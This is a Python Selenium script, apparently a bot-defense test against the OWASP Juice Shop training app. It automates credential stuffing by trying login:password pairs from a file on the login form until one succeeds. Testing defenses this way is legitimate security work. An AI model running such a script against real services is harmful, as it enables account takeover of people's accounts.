"""Juice Shop Bot defense test v1.3 E.Novak 26 June 2025"""
# Line 37 added to account for differences in pure Linux vs. Linux subsystem for Windows
# Line 53 commented out due to change in v17.0 of Juice Shop
# Line 54 added to replace line 53 due to change in v17.0 of Juice Shop
import sys
import time
from selenium import webdriver
from selenium.webdriver.chrome.service import Service
from selenium.webdriver.common.by import By
from webdriver_manager.chrome import ChromeDriverManager
from selenium.common.exceptions import NoSuchElementException


if len(sys.argv) != 2:
    print("usage: " + sys.argv[0] + " <JuiceShop-FQDN>")
    sys.exit()


url = "https://" + sys.argv[1] + "/#/login"
browser = webdriver.Chrome(service=Service(ChromeDriverManager().install()))
time.sleep(2)
credentialsFile = open('./data/credentials.txt', 'r')
credentials = credentialsFile.readlines()


def main(credentials):
    a = 1
    try:
        for line in credentials:
            print(line)
            credentialPairs = line.rstrip()
            both = credentialPairs.split(':')
            password = both.pop()
            login = both.pop()
            print('---------------------------------------------------')
            print('Login: ' + login)
            print('Password: ' + password)
            browser.get(url)
            browser.refresh()
            """Fix to accept cookies and remove Welcome Page"""
            if a == 1:
                """Accept Cookies only once"""
                browser.find_element(by=By.XPATH, value='/html/body/div[1]/div/a').click()
                time.sleep(2)
                """Accept Welcome page only once"""
                browser.find_element(by=By.XPATH,value='//*[@id="mat-mdc-dialog-0"]/div/div/app-welcome-banner/div[2]/button[2]').click()
                a -= 1
            browser.find_element(by=By.NAME, value="email").send_keys(login)
            browser.find_element(by=By.NAME, value="password").send_keys(password)
            time.sleep(1.5)
            element = browser.find_element(by=By.XPATH, value='//*[@id="loginButton"]/span[1]')
            browser.execute_script("arguments[0].click();", element)
            time.sleep(1.0)
            try:
               # browser.find_element(by=By.XPATH, value='/html/body/app-root/div/mat-sidenav-container/mat-sidenav-content/app-search-result/div/div/div[2]/mat-grid-list/div/mat-grid-tile[1]/div/mat-card/div[1]/div[1]/img')
                browser.find_element(by=By.XPATH, value='/html/body/app-root/mat-sidenav-container/mat-sidenav-content/app-search-result/div/div/div[2]/mat-grid-list/div/mat-grid-tile[1]/div/mat-card/div[1]/div[1]/img')
                time.sleep(1.0)
                print("FOUND THE PASSWORD! BREAKING")
                time.sleep(20)
                break
            except NoSuchElementException:
                print("Wrong Password!")
                time.sleep(1.0)
        
            
    except KeyboardInterrupt:
        print('---------------------------------------------------')
        print("Bye!")
        sys.exit()


if __name__ == "__main__":
    print(main(credentials))
